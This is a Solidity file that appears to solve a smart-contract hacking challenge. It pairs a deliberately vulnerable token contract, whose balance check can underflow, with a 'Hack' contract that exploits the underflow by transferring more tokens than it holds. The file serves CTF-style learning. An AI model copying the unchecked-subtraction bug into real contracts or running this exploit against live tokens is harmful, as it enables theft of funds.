// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../node_modules/hardhat-console/contracts/console.sol";
/**
The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

  Things that might help:

What is an odometer?
**/
contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

interface TokenI {
  function totalSupply() external view returns(uint);
  function transfer(address _to, uint _value) external returns (bool);
  function balanceOf(address _owner) external view returns (uint);
}

/**
blockhash(block.number.sub(1)) doesn't work on remix env
**/
contract Hack {

  TokenI token;
  constructor(address _add) public{
    token = TokenI(_add);
  }

  function getBalance() public view returns(uint) {
    return token.balanceOf(address(this));
  }
  
  function hack(address _to) public {
    token.transfer(_to, 21);
  }

  
}
